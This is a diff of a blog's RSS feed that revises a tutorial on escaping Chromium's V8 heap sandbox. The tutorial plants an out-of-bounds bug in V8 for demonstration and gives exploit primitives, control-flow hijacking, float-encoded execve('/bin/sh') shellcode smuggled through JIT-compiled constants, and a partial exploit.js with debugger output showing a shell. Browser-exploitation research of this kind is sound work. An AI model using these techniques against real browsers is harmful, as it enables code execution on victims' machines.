@@ -1,12 +1,12 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>browser on Anvbis</title><link>https://anvbis.github.io/tags/browser/</link><description>Recent content in browser on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Sat, 27 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/browser/index.xml" rel="self" type="application/rss+xml"/><item><title>Escaping the V8 Heap Sandbox</title><link>https://anvbis.github.io/posts/chrome-v8-escaping-the-v8-heap-sandbox/</link><pubDate>Sat, 27 Nov 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/chrome-v8-escaping-the-v8-heap-sandbox/</guid><description>Overview The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.
-I thought it would be worthwile to detail one such method in an article. I&amp;rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained.</description><content>&lt;h2 id="overview">Overview&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>browser on Anvbis</title><link>https://anvbis.github.io/tags/browser/</link><description>Recent content in browser on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Sat, 27 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/browser/index.xml" rel="self" type="application/rss+xml"/><item><title>Escaping Chromium's V8 Heap Sandbox</title><link>https://anvbis.github.io/posts/chrome-v8-escaping-chromiums-v8-heap-sandbox/</link><pubDate>Sat, 27 Nov 2021 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/chrome-v8-escaping-chromiums-v8-heap-sandbox/</guid><description>1. Overview The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.
+I thought it would be worthwile to detail one such method in an article. I&amp;rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained.</description><content>&lt;h2 id="1-overview">1. Overview&lt;/h2>
 &lt;p>The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.&lt;/p>
 &lt;p>I thought it would be worthwile to detail one such method in an article. I&amp;rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained. This is mostly for my own reference, but anyone is welcome to learn from it.&lt;/p>
-&lt;h2 id="introducing-the-heap-sandbox">Introducing the Heap Sandbox&lt;/h2>
+&lt;h2 id="2-introducing-the-heap-sandbox">2. Introducing the Heap Sandbox&lt;/h2>
 &lt;p>First introduced into V8 around a year ago (at the time of this post), the motivation behind the implementation of the heap sandbox was to limit an attacker&amp;rsquo;s ability to write data outside of V8&amp;rsquo;s heap address-space.&lt;/p>
 &lt;p>It primarily performs this through the isolation of all external pointers and references to off-heap objects (e.g. the backing store of an ArrayBuffer object). In the heap sandbox, these pointers are converted to references to an external pointer table, essentially indices of a lookup table.&lt;/p>
 &lt;p>Memory corruption outside of V8&amp;rsquo;s heap is considered to be an escape from this sandbox. That definition also covers arbitrary code execution.&lt;/p>
-&lt;h3 id="exploring-the-sandbox">Exploring the Sandbox&lt;/h3>
+&lt;h3 id="21-exploring-the-sandbox">2.1. Exploring the Sandbox&lt;/h3>
 &lt;p>So as previously mentioned, external pointers should be isolated and converted to references to elements of an external pointer table, we can explore what this looks like in practice.&lt;/p>
 &lt;p>We can start by allocating two objects, &lt;code>a&lt;/code> and &lt;code>b&lt;/code>, printing debug information, and digging around the memory a little.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
@@ -55,11 +55,12 @@ DebugPrint: 0x19f90010ba95: [JSArrayBuffer]
 - byte_length: 1337
 - max_byte_length: 1337
 ...
-&lt;/code>&lt;/pre>&lt;p>I don&amp;rsquo;t want to dive too deep into the internals of the V8 heap sandbox, so I won&amp;rsquo;t go any further for today. But it is good to know that you can replace an object&amp;rsquo;s index with that of another, potentially giving you write access somewhere else external to the heap.&lt;/p>
-&lt;h2 id="escaping-the-heap-sandbox">Escaping the Heap Sandbox&lt;/h2>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;h3 id="an-example-vulnerability">An Example Vulnerability&lt;/h3>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;/code>&lt;/pre>&lt;p>I don&amp;rsquo;t want to dive too deep into the internals of the V8 heap sandbox in this article, so I won&amp;rsquo;t go any further for today. But it is good to know that you can replace an object&amp;rsquo;s index with that of another, potentially giving you write access somewhere else external to the heap.&lt;/p>
+&lt;h2 id="3-escaping-the-heap-sandbox">3. Escaping the Heap Sandbox&lt;/h2>
+&lt;p>Now we move on to actually performing a heap sandbox escape. I&amp;rsquo;ve included a patch for a very, very, very simple array out-of-bounds vulnerability below. I&amp;rsquo;ll be using that to demonstrate the technique.&lt;/p>
+&lt;p>Note: If you want to follow along, the commit hash for the build of V8 I&amp;rsquo;m using is &lt;code>bd5b3ae5422e9fa1d0f7a281bbdf709e6db65f62&lt;/code>.&lt;/p>
+&lt;h3 id="31-an-example-vulnerability">3.1. An Example Vulnerability&lt;/h3>
+&lt;p>As mentioned above, the vulnerability introduced here is very simple. A new &lt;code>JSArray&lt;/code> builtin is added that allows you to change the length of any array to an arbitrary value, effectively providing you with out-of-bounds access below the array.&lt;/p>
 &lt;div class="collapsable-code">
 &lt;input id="1" type="checkbox" checked />
 &lt;label for="1">
@@ -136,11 +137,11 @@ Builtin::kArrayPrototypeReverse, 0, false);
 SimpleInstallFunction(isolate_, proto, &amp;#34;shift&amp;#34;,
 &lt;/code>&lt;/pre>
 &lt;/div>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>Here&amp;rsquo;s some Javascript code that triggers this vulnerability. The &lt;code>len&lt;/code> builtin is called, and sets the length of the array to the value of &lt;code>1337&lt;/code>.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>];
 &lt;span style="color:#a6e22e">a&lt;/span>.&lt;span style="color:#a6e22e">len&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
 &lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>);
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can see in the debug information below, that while the array only has two elements, the length of the array is &lt;code>1337&lt;/code>, giving us unrestricted out-of-bounds access below it.&lt;/p>
 &lt;pre>&lt;code>DebugPrint: 0x27ff0004b9c9: [JSArray]
 - map: 0x27ff0018e6bd &amp;lt;Map[16](PACKED_DOUBLE_ELEMENTS)&amp;gt; [FastProperties]
 - prototype: 0x27ff0018e11d &amp;lt;JSArray[0]&amp;gt;
@@ -155,39 +156,43 @@ SimpleInstallFunction(isolate_, proto, &amp;#34;shift&amp;#34;,
 1: 2.2
 }
 ...
-&lt;/code>&lt;/pre>&lt;h3 id="building-exploit-primitives">Building Exploit Primitives&lt;/h3>
-&lt;p>&amp;hellip;&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">oob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>];
+&lt;/code>&lt;/pre>&lt;h3 id="32-a-few-exploit-primitives">3.2. A Few Exploit Primitives&lt;/h3>
+&lt;p>I&amp;rsquo;m not going to go into too much detail here, as there are a lot of resources detailing common V8 exploit primitives. Plus if you&amp;rsquo;re reading this I&amp;rsquo;m assuming you already know a little about V8 exploitation.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">8&lt;/span>);
+&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Float64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
+&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">is&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">BigUint64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
+&lt;span style="color:#75715e">/* converts a float to a 64-bit uint */&lt;/span>
+&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>) {
+&lt;span style="color:#a6e22e">fs&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>;
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">is&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
+}
+&lt;span style="color:#75715e">/* converts a 64-bit uint to a float */&lt;/span>
+&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>) {
+&lt;span style="color:#a6e22e">is&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>;
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
+}
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* create an oob array */&lt;/span>
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">oob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>];
 &lt;span style="color:#a6e22e">oob&lt;/span>.&lt;span style="color:#a6e22e">len&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
 &lt;span style="color:#75715e">/* flt.elements @ oob[] */&lt;/span>
 &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">flt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>[&lt;span style="color:#ae81ff">1.1&lt;/span>];
 &lt;span style="color:#75715e">/* obj.elements @ oob[] */&lt;/span>
 &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>};
 &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>[&lt;span style="color:#a6e22e">tmp&lt;/span>];
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">8&lt;/span>);
-&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Float64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
-&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">is&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">BigUint64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
-&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>) {
-&lt;span style="color:#a6e22e">fs&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>;
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">is&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* addrof primitive */&lt;/span>
+&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">addrof&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>) {
 }
-&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>) {
-&lt;span style="color:#a6e22e">is&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>;
-&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
-}
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;&lt;/p>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">addrof&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>) {
-}
+&lt;span style="color:#75715e">/* 64-bit read primitive */&lt;/span>
 &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#a6e22e">p&lt;/span>) {
 &lt;span style="color:#75715e">// ...
 &lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]);
 }
+&lt;span style="color:#75715e">/* 64-bit write primitive */&lt;/span>
 &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>(&lt;span style="color:#a6e22e">p&lt;/span>, &lt;span style="color:#a6e22e">x&lt;/span>) {
 &lt;span style="color:#75715e">// ...
 &lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>);
 }
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="redirecting-code-execution">Redirecting Code Execution&lt;/h3>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="33-redirecting-code-execution">3.3. Redirecting Code Execution&lt;/h3>
 &lt;p>&amp;hellip;&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
 &lt;span style="color:#66d9ef">return&lt;/span>;
@@ -241,7 +246,7 @@ pwndbg&amp;gt; job 0x31df001467e5
 pwndbg&amp;gt; c
 ...
 ► 0x55f3898b6c5f &amp;lt;Builtins_CallFunction_ReceiverIsAny+287&amp;gt; jmp rcx &amp;lt;0x6161616161616161&amp;gt;
-&lt;/code>&lt;/pre>&lt;h3 id="writing-shellcode">Writing Shellcode&lt;/h3>
+&lt;/code>&lt;/pre>&lt;h3 id="34-writing-shellcode">3.4. Writing Shellcode&lt;/h3>
 &lt;p>&amp;hellip;&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
 &lt;span style="color:#66d9ef">return&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>, &lt;span style="color:#ae81ff">3.3&lt;/span>, &lt;span style="color:#ae81ff">4.4&lt;/span>];
@@ -309,7 +314,7 @@ $3 = 0x14
 &lt;span style="color:#ae81ff">2.63486047652296056448306022844&lt;/span>&lt;span style="color:#a6e22e">E&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">284&lt;/span>
 ];
 }
-&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="executing-shellcode">Executing Shellcode&lt;/h3>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="35-executing-shellcode">3.5. Executing Shellcode&lt;/h3>
 &lt;p>&amp;hellip;&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* execve(&amp;#34;/bin/sh&amp;#34;, 0, 0); */&lt;/span>
 &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
@@ -373,8 +378,51 @@ Continuing.
 [Thread 0x7f07a5164700 (LWP 288624) exited]
 process 288620 is executing new program: /usr/bin/dash
 $ id
-&lt;/code>&lt;/pre>&lt;h3 id="building-an-exploit">Building an Exploit&lt;/h3>
+&lt;/code>&lt;/pre>&lt;h3 id="36-building-an-exploit">3.6. Building an Exploit&lt;/h3>
 &lt;p>&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* ... */&lt;/span>
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">arb_read&lt;/span>(&lt;span style="color:#a6e22e">addrof&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
+&lt;span style="color:#75715e">/* ... */&lt;/span>
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">entry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">arb_read&lt;/span>(&lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xc&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>));
+&lt;span style="color:#75715e">/* ... */&lt;/span>
+&lt;span style="color:#a6e22e">arb_write&lt;/span>(&lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xc&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>, &lt;span style="color:#a6e22e">entry&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x7c&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>);
+&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="collapsable-code">
+&lt;input id="2" type="checkbox" checked />
+&lt;label for="2">
+&lt;span class="collapsable-code__language">js&lt;/span>
+&lt;span class="collapsable-code__title">exploit.js&lt;/span>
+&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
+&lt;/label>
+&lt;pre class="language-js" >&lt;code>
+var bs = new ArrayBuffer(8);
+var fs = new Float64Array(bs);
+var is = new BigUint64Array(bs);
+/* converts a float to a 64-bit uint */
+function ftoi(x) {
+fs[0] = x;
+return is[0];
+}
+/* converts a 64-bit uint to a float */
+function itof(x) {
+is[0] = x;
+return fs[0];
+}
+/* execve(&amp;#34;/bin/sh&amp;#34;, 0, 0); */
+const foo = () =&amp;gt; {
+return [
+1.0,
+1.95538254221075331056310651818E-246,
+1.95606125582421466942709801013E-246,
+1.99957147195425773436923756715E-246,
+1.95337673326740932133292175341E-246,
+2.63486047652296056448306022844E-284
+];
+}
+for (let i = 0; i &amp;lt; 0x10000; i&amp;#43;&amp;#43;)
+foo();
+&lt;/code>&lt;/pre>
+&lt;/div>
 &lt;h2 id="references">References&lt;/h2>
 &lt;ul>
 &lt;li>&lt;a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8">V8 Sandbox - High-Level Design Doc&lt;/a>&lt;/li>
